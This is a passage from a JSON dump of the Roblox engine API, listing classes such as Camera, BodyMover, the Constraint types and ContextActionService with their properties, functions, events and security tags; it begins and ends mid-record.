unction"},{"Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"Event","tags":[],"Class":"BindableEvent","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BindableFunction","tags":[]},{"ReturnType":"Tuple","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"Invoke","tags":[],"Class":"BindableFunction","type":"YieldFunction"},{"ReturnType":"Tuple","Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"OnInvoke","tags":[],"Class":"BindableFunction","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"BodyMover","tags":[]},{"Superclass":"BodyMover","type":"Class","Name":"BodyAngularVelocity","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"AngularVelocity","tags":[],"Class":"BodyAngularVelocity"},{"ValueType":"Vector3","type":"Property","Name":"MaxTorque","tags":[],"Class":"BodyAngularVelocity"},{"ValueType":"float","type":"Property","Name":"P","tags":[],"Class":"BodyAngularVelocity"},{"ValueType":"Vector3","type":"Property","Name":"angularvelocity","tags":["deprecated"],"Class":"BodyAngularVelocity"},{"ValueType":"Vector3","type":"Property","Name":"maxTorque","tags":["deprecated"],"Class":"BodyAngularVelocity"},{"Superclass":"BodyMover","type":"Class","Name":"BodyForce","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Force","tags":[],"Class":"BodyForce"},{"ValueType":"Vector3","type":"Property","Name":"force","tags":["deprecated"],"Class":"BodyForce"},{"Superclass":"BodyMover","type":"Class","Name":"BodyGyro","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"BodyGyro"},{"ValueType":"float","type":"Property","Name":"D","tags":[],"Class":"BodyGyro"},{"ValueType":"Vector3","type":"Property","Name":"MaxTorque","tags":[],"Class":"BodyGyro"},{"ValueType":"float","type":"Property","Name":"P","tags":[],"Class":"BodyGyro"},{"ValueType":"CoordinateFrame","type":"Property","Name":"cframe","tags":["deprecated"],"Class":"BodyGyro"},{"ValueType":"Vector3","type":"Property","Name":"maxTorque","tags":["deprecated"],"Class":"BodyGyro"},{"Superclass":"BodyMover","type":"Class","Name":"BodyPosition","tags":[]},{"ValueType":"float","type":"Property","Name":"D","tags":[],"Class":"BodyPosition"},{"ValueType":"Vector3","type":"Property","Name":"MaxForce","tags":[],"Class":"BodyPosition"},{"ValueType":"float","type":"Property","Name":"P","tags":[],"Class":"BodyPosition"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"BodyPosition"},{"ValueType":"Vector3","type":"Property","Name":"maxForce","tags":["deprecated"],"Class":"BodyPosition"},{"ValueType":"Vector3","type":"Property","Name":"position","tags":["deprecated"],"Class":"BodyPosition"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetLastForce","tags":[],"Class":"BodyPosition","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"lastForce","tags":["deprecated"],"Class":"BodyPosition","type":"Function"},{"Arguments":[],"Name":"ReachedTarget","tags":[],"Class":"BodyPosition","type":"Event"},{"Superclass":"BodyMover","type":"Class","Name":"BodyThrust","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Force","tags":[],"Class":"BodyThrust"},{"ValueType":"Vector3","type":"Property","Name":"Location","tags":[],"Class":"BodyThrust"},{"ValueType":"Vector3","type":"Property","Name":"force","tags":["deprecated"],"Class":"BodyThrust"},{"ValueType":"Vector3","type":"Property","Name":"location","tags":["deprecated"],"Class":"BodyThrust"},{"Superclass":"BodyMover","type":"Class","Name":"BodyVelocity","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"MaxForce","tags":[],"Class":"BodyVelocity"},{"ValueType":"float","type":"Property","Name":"P","tags":[],"Class":"BodyVelocity"},{"ValueType":"Vector3","type":"Property","Name":"Velocity","tags":[],"Class":"BodyVelocity"},{"ValueType":"Vector3","type":"Property","Name":"maxForce","tags":["deprecated"],"Class":"BodyVelocity"},{"ValueType":"Vector3","type":"Property","Name":"velocity","tags":["deprecated"],"Class":"BodyVelocity"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetLastForce","tags":[],"Class":"BodyVelocity","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"lastForce","tags":[],"Class":"BodyVelocity","type":"Function"},{"Superclass":"BodyMover","type":"Class","Name":"RocketPropulsion","tags":[]},{"ValueType":"float","type":"Property","Name":"CartoonFactor","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"MaxSpeed","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"MaxThrust","tags":[],"Class":"RocketPropulsion"},{"ValueType":"Vector3","type":"Property","Name":"MaxTorque","tags":[],"Class":"RocketPropulsion"},{"ValueType":"Object","type":"Property","Name":"Target","tags":[],"Class":"RocketPropulsion"},{"ValueType":"Vector3","type":"Property","Name":"TargetOffset","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"TargetRadius","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"ThrustD","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"ThrustP","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"TurnD","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"TurnP","tags":[],"Class":"RocketPropulsion"},{"ReturnType":"void","Arguments":[],"Name":"Abort","tags":[],"Class":"RocketPropulsion","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Fire","tags":[],"Class":"RocketPropulsion","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"fire","tags":["deprecated"],"Class":"RocketPropulsion","type":"Function"},{"Arguments":[],"Name":"ReachedTarget","tags":[],"Class":"RocketPropulsion","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BoolValue","tags":[]},{"ValueType":"bool","type":"Property","Name":"Value","tags":[],"Class":"BoolValue"},{"Arguments":[{"Name":"value","Type":"bool"}],"Name":"Changed","tags":[],"Class":"BoolValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"bool"}],"Name":"changed","tags":["deprecated"],"Class":"BoolValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BrickColorValue","tags":[]},{"ValueType":"BrickColor","type":"Property","Name":"Value","tags":[],"Class":"BrickColorValue"},{"Arguments":[{"Name":"value","Type":"BrickColor"}],"Name":"Changed","tags":[],"Class":"BrickColorValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"BrickColor"}],"Name":"changed","tags":["deprecated"],"Class":"BrickColorValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Button","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"active","Default":null}],"Name":"SetActive","tags":["PluginSecurity"],"Class":"Button","type":"Function"},{"Arguments":[],"Name":"Click","tags":["PluginSecurity"],"Class":"Button","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"CFrameValue","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"Value","tags":[],"Class":"CFrameValue"},{"Arguments":[{"Name":"value","Type":"CoordinateFrame"}],"Name":"Changed","tags":[],"Class":"CFrameValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"CoordinateFrame"}],"Name":"changed","tags":["deprecated"],"Class":"CFrameValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"CacheableContentProvider","tags":[]},{"Superclass":"CacheableContentProvider","type":"Class","Name":"MeshContentProvider","tags":[]},{"Superclass":"CacheableContentProvider","type":"Class","Name":"SolidModelContentProvider","tags":[]},{"Superclass":"CacheableContentProvider","type":"Class","Name":"TextureContentProvider","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Camera","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"Camera"},{"ValueType":"Object","type":"Property","Name":"CameraSubject","tags":[],"Class":"Camera"},{"ValueType":"CameraType","type":"Property","Name":"CameraType","tags":[],"Class":"Camera"},{"ValueType":"CoordinateFrame","type":"Property","Name":"CoordinateFrame","tags":["deprecated","hidden"],"Class":"Camera"},{"ValueType":"float","type":"Property","Name":"FieldOfView","tags":[],"Class":"Camera"},{"ValueType":"CoordinateFrame","type":"Property","Name":"Focus","tags":[],"Class":"Camera"},{"ValueType":"bool","type":"Property","Name":"HeadLocked","tags":[],"Class":"Camera"},{"ValueType":"float","type":"Property","Name":"HeadScale","tags":[],"Class":"Camera"},{"ValueType":"Vector2","type":"Property","Name":"ViewportSize","tags":["readonly"],"Class":"Camera"},{"ValueType":"CoordinateFrame","type":"Property","Name":"focus","tags":["deprecated"],"Class":"Camera"},{"ReturnType":"float","Arguments":[],"Name":"GetPanSpeed","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[],"Name":"GetRenderCFrame","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"GetRoll","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"GetTiltSpeed","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CoordinateFrame","Name":"endPos","Default":null},{"Type":"CoordinateFrame","Name":"endFocus","Default":null},{"Type":"float","Name":"duration","Default":null}],"Name":"Interpolate","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"units","Default":null}],"Name":"PanUnits","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Ray","Arguments":[{"Type":"float","Name":"x","Default":null},{"Type":"float","Name":"y","Default":null},{"Type":"float","Name":"depth","Default":"0"}],"Name":"ScreenPointToRay","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CameraPanMode","Name":"mode","Default":"Classic"}],"Name":"SetCameraPanMode","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"rollAngle","Default":null}],"Name":"SetRoll","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"units","Default":null}],"Name":"TiltUnits","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Ray","Arguments":[{"Type":"float","Name":"x","Default":null},{"Type":"float","Name":"y","Default":null},{"Type":"float","Name":"depth","Default":"0"}],"Name":"ViewportPointToRay","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Vector3","Name":"worldPoint","Default":null}],"Name":"WorldToScreenPoint","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Vector3","Name":"worldPoint","Default":null}],"Name":"WorldToViewportPoint","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"float","Name":"distance","Default":null}],"Name":"Zoom","tags":["RobloxScriptSecurity"],"Class":"Camera","type":"Function"},{"Arguments":[{"Name":"entering","Type":"bool"}],"Name":"FirstPersonTransition","tags":["RobloxPlaceSecurity"],"Class":"Camera","type":"Event"},{"Arguments":[],"Name":"InterpolationFinished","tags":[],"Class":"Camera","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ChangeHistoryService","tags":["notCreatable"]},{"ReturnType":"Tuple","Arguments":[],"Name":"GetCanRedo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"Tuple","Arguments":[],"Name":"GetCanUndo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Redo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ResetWaypoints","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"state","Default":null}],"Name":"SetEnabled","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"SetWaypoint","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Undo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"Arguments":[{"Name":"waypoint","Type":"string"}],"Name":"OnRedo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Event"},{"Arguments":[{"Name":"waypoint","Type":"string"}],"Name":"OnUndo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"CharacterAppearance","tags":[]},{"Superclass":"CharacterAppearance","type":"Class","Name":"BodyColors","tags":[]},{"ValueType":"BrickColor","type":"Property","Name":"HeadColor","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"LeftArmColor","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"LeftLegColor","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"RightArmColor","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"RightLegColor","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"TorsoColor","tags":[],"Class":"BodyColors"},{"Superclass":"CharacterAppearance","type":"Class","Name":"CharacterMesh","tags":[]},{"ValueType":"int","type":"Property","Name":"BaseTextureId","tags":[],"Class":"CharacterMesh"},{"ValueType":"BodyPart","type":"Property","Name":"BodyPart","tags":[],"Class":"CharacterMesh"},{"ValueType":"int","type":"Property","Name":"MeshId","tags":[],"Class":"CharacterMesh"},{"ValueType":"int","type":"Property","Name":"OverlayTextureId","tags":[],"Class":"CharacterMesh"},{"Superclass":"CharacterAppearance","type":"Class","Name":"Clothing","tags":[]},{"Superclass":"Clothing","type":"Class","Name":"Pants","tags":[]},{"ValueType":"Content","type":"Property","Name":"PantsTemplate","tags":[],"Class":"Pants"},{"Superclass":"Clothing","type":"Class","Name":"Shirt","tags":[]},{"ValueType":"Content","type":"Property","Name":"ShirtTemplate","tags":[],"Class":"Shirt"},{"Superclass":"CharacterAppearance","type":"Class","Name":"ShirtGraphic","tags":[]},{"ValueType":"Content","type":"Property","Name":"Graphic","tags":[],"Class":"ShirtGraphic"},{"Superclass":"CharacterAppearance","type":"Class","Name":"Skin","tags":["deprecated"]},{"ValueType":"BrickColor","type":"Property","Name":"SkinColor","tags":[],"Class":"Skin"},{"Superclass":"Instance","type":"Class","Name":"Chat","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"partOrCharacter","Default":null},{"Type":"string","Name":"message","Default":null},{"Type":"ChatColor","Name":"color","Default":"Blue"}],"Name":"Chat","tags":[],"Class":"Chat","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"stringToFilter","Default":null},{"Type":"Instance","Name":"playerFrom","Default":null},{"Type":"Instance","Name":"playerTo","Default":null}],"Name":"FilterStringAsync","tags":[],"Class":"Chat","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"stringToFilter","Default":null},{"Type":"Instance","Name":"playerToFilterFor","Default":null}],"Name":"FilterStringForPlayerAsync","tags":[],"Class":"Chat","type":"YieldFunction"},{"Arguments":[{"Name":"part","Type":"Instance"},{"Name":"message","Type":"string"},{"Name":"color","Type":"ChatColor"}],"Name":"Chatted","tags":[],"Class":"Chat","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ChatFilter","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"ClickDetector","tags":[]},{"ValueType":"float","type":"Property","Name":"MaxActivationDistance","tags":[],"Class":"ClickDetector"},{"Arguments":[{"Name":"playerWhoClicked","Type":"Instance"}],"Name":"MouseClick","tags":[],"Class":"ClickDetector","type":"Event"},{"Arguments":[{"Name":"playerWhoHovered","Type":"Instance"}],"Name":"MouseHoverEnter","tags":[],"Class":"ClickDetector","type":"Event"},{"Arguments":[{"Name":"playerWhoHovered","Type":"Instance"}],"Name":"MouseHoverLeave","tags":[],"Class":"ClickDetector","type":"Event"},{"Arguments":[{"Name":"playerWhoClicked","Type":"Instance"}],"Name":"mouseClick","tags":["deprecated"],"Class":"ClickDetector","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ClusterPacketCache","tags":[]},{"Superclass":"Instance","type":"Class","Name":"CollectionService","tags":[]},{"ReturnType":"Objects","Arguments":[{"Type":"string","Name":"class","Default":null}],"Name":"GetCollection","tags":[],"Class":"CollectionService","type":"Function"},{"Arguments":[{"Name":"instance","Type":"Instance"}],"Name":"ItemAdded","tags":[],"Class":"CollectionService","type":"Event"},{"Arguments":[{"Name":"instance","Type":"Instance"}],"Name":"ItemRemoved","tags":[],"Class":"CollectionService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Color3Value","tags":[]},{"ValueType":"Color3","type":"Property","Name":"Value","tags":[],"Class":"Color3Value"},{"Arguments":[{"Name":"value","Type":"Color3"}],"Name":"Changed","tags":[],"Class":"Color3Value","type":"Event"},{"Arguments":[{"Name":"value","Type":"Color3"}],"Name":"changed","tags":["deprecated"],"Class":"Color3Value","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Configuration","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Constraint","tags":[]},{"ValueType":"Object","type":"Property","Name":"Attachment0","tags":[],"Class":"Constraint"},{"ValueType":"Object","type":"Property","Name":"Attachment1","tags":[],"Class":"Constraint"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Constraint"},{"Superclass":"Constraint","type":"Class","Name":"BallSocketConstraint","tags":[]},{"ValueType":"bool","type":"Property","Name":"LimitsEnabled","tags":[],"Class":"BallSocketConstraint"},{"ValueType":"float","type":"Property","Name":"Restitution","tags":[],"Class":"BallSocketConstraint"},{"ValueType":"float","type":"Property","Name":"UpperAngle","tags":[],"Class":"BallSocketConstraint"},{"Superclass":"Constraint","type":"Class","Name":"HingeConstraint","tags":[]},{"ValueType":"ActuatorType","type":"Property","Name":"ActuatorType","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"AngularSpeed","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"AngularVelocity","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"CurrentAngle","tags":["readonly"],"Class":"HingeConstraint"},{"ValueType":"bool","type":"Property","Name":"LimitsEnabled","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"LowerAngle","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"MotorMaxAcceleration","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"MotorMaxTorque","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"Restitution","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"ServoMaxTorque","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"TargetAngle","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"UpperAngle","tags":[],"Class":"HingeConstraint"},{"Superclass":"Constraint","type":"Class","Name":"MoveToConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"MaxForce","tags":[],"Class":"MoveToConstraint"},{"ValueType":"float","type":"Property","Name":"StabilizingDistance","tags":[],"Class":"MoveToConstraint"},{"ValueType":"float","type":"Property","Name":"Velocity","tags":[],"Class":"MoveToConstraint"},{"Superclass":"Constraint","type":"Class","Name":"RodConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentDistance","tags":["readonly"],"Class":"RodConstraint"},{"ValueType":"float","type":"Property","Name":"Length","tags":[],"Class":"RodConstraint"},{"Superclass":"Constraint","type":"Class","Name":"RopeConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentLength","tags":["readonly"],"Class":"RopeConstraint"},{"ValueType":"float","type":"Property","Name":"Length","tags":[],"Class":"RopeConstraint"},{"ValueType":"float","type":"Property","Name":"Restitution","tags":[],"Class":"RopeConstraint"},{"Superclass":"Constraint","type":"Class","Name":"SlidingBallConstraint","tags":[]},{"ValueType":"ActuatorType","type":"Property","Name":"ActuatorType","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"CurrentPosition","tags":["readonly"],"Class":"SlidingBallConstraint"},{"ValueType":"bool","type":"Property","Name":"LimitsEnabled","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"LowerLimit","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"MotorMaxAcceleration","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"MotorMaxForce","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"Restitution","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"ServoMaxForce","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"Speed","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"TargetPosition","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"UpperLimit","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"Velocity","tags":[],"Class":"SlidingBallConstraint"},{"Superclass":"SlidingBallConstraint","type":"Class","Name":"CylindricalConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"AzimuthalAngle","tags":[],"Class":"CylindricalConstraint"},{"ValueType":"float","type":"Property","Name":"InclinationAngle","tags":[],"Class":"CylindricalConstraint"},{"Superclass":"SlidingBallConstraint","type":"Class","Name":"PrismaticConstraint","tags":[]},{"Superclass":"Constraint","type":"Class","Name":"SpringConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentLength","tags":["readonly"],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"Damping","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"FreeLength","tags":[],"Class":"SpringConstraint"},{"ValueType":"bool","type":"Property","Name":"LimitsEnabled","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"MaxForce","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"MaxLength","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"MinLength","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"Stiffness","tags":[],"Class":"SpringConstraint"},{"Superclass":"Instance","type":"Class","Name":"ContentFilter","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"outstandingRequests","Default":null},{"Type":"int","Name":"cacheSize","Default":null}],"Name":"SetFilterLimits","tags":["LocalUserSecurity"],"Class":"ContentFilter","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetFilterUrl","tags":["LocalUserSecurity"],"Class":"ContentFilter","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"ContentProvider","tags":[]},{"ValueType":"string","type":"Property","Name":"BaseUrl","tags":["readonly"],"Class":"ContentProvider"},{"ValueType":"int","type":"Property","Name":"RequestQueueSize","tags":["readonly"],"Class":"ContentProvider"},{"ReturnType":"void","Arguments":[{"Type":"Content","Name":"contentId","Default":null}],"Name":"Preload","tags":[],"Class":"ContentProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetAssetUrl","tags":["LocalUserSecurity"],"Class":"ContentProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetBaseUrl","tags":["LocalUserSecurity"],"Class":"ContentProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"count","Default":null}],"Name":"SetCacheSize","tags":["LocalUserSecurity"],"Class":"ContentProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"count","Default":null}],"Name":"SetThreadPool","tags":["LocalUserSecurity"],"Class":"ContentProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Array","Name":"contentIdList","Default":null}],"Name":"PreloadAsync","tags":[],"Class":"ContentProvider","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"ContextActionService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"Function","Name":"functionToBind","Default":null},{"Type":"bool","Name":"createTouchButton","Default":null},{"Type":"Tuple","Name":"inputTypes","Default":null}],"Name":"BindAction","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"Function","Name":"functionToBind","Default":null},{"Type":"bool","Name":"createTouchButton","Default":null},{"Type":"Tuple","Name":"inputTypes","Default":null}],"Name":"BindActionToInputTypes","tags":["deprecated"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UserInputType","Name":"userInputTypeForActivation","Default":null},{"Type":"KeyCode","Name":"keyCodeForActivation","Default":"Unknown"}],"Name":"BindActivate","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"Function","Name":"functionToBind","Default":null},{"Type":"bool","Name":"createTouchButton","Default":null},{"Type":"Tuple","Name":"inputTypes","Default":null}],"Name":"BindCoreAction","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"UserInputState","Name":"state","Default":null},{"Type":"Instance","Name":"inputObject","Default":null}],"Name":"CallFunction","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"Instance","Name":"actionButton","Default":null}],"Name":"FireActionButtonFoundSignal","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"Dictionary","Arguments":[],"Name":"GetAllBoundActionInfo","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"Dictionary","Arguments":[{"Type":"string","Name":"actionName","Default":null}],"Name":"GetBoundActionInfo","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetCurrentLocalToolIcon","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"string","Name":"description","Default":null}],"Name":"SetDescription","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"string","Name":"image","Default":null}],"Name":"SetImage","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"UDim2","Name":"position","Default":null}],"Name":"SetPosition","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"string","Name":"title","Default":null}],"Name":"SetTitle","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null}],"Name":"UnbindAction","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UserInputType","Name":"userInputTypeForActivation","Default":null},{"Type":"KeyCode","Name":"keyCodeForActivation","Default":"Unknown"}],"Name":"UnbindActivate","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"UnbindAllActions","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null}],"Name":"UnbindCoreAction","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"actionName","Default":null}],"Name":"GetButton","tags":[],"Class":"ContextActionService","type":"YieldFunction"},{"Arguments":[{"Name":"actionAdded","Type":"string"},{"Name":"createTouchButton","Type":"bool"},{"Name":"functionInfoTable","Type":"Dictionary"}],"Name":"BoundActionAdded","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"actionChanged","Type":"string"},{"Name":"changeName","Type":"string"},{"Name":"changeTable","Type":"Dictionary"}],"Name":"BoundActionChanged","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"actionRemoved","Type":"string"},{"Name":"functionInfoTable","Type":"Dictionary"}],"Name":"BoundActionRemoved","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"actionName","Type":"string"}],"Name":"GetActionButtonEvent","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"toolEquipped","Type":"Instance"}],"Name":"LocalToolEquipped","tags":[],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"toolUnequipped","Type":"Instance"}],"Name":"LocalToolUnequipped","tags":[],"Class":"ContextActionService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Controller","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"Button","Name":"button","Default":null},{"Type":"string","Name":"caption","Default":null}],"Name":"BindButton","tags":[],"Class":"Controller","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Button","Name":"button","Default":null}],"Name":"GetButton","tags":[],"Class":"Controller","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Button","Name":"button","Default":null}],"Name":"UnbindButton","tags":[],"Class":"Controller","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Button","Name":"button","Default":null},{"Type":"string","Name":"caption","Default":null}],"Name":"bindButton","tags":["deprecated"],"Class":"Controller","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Button","Name":"button","D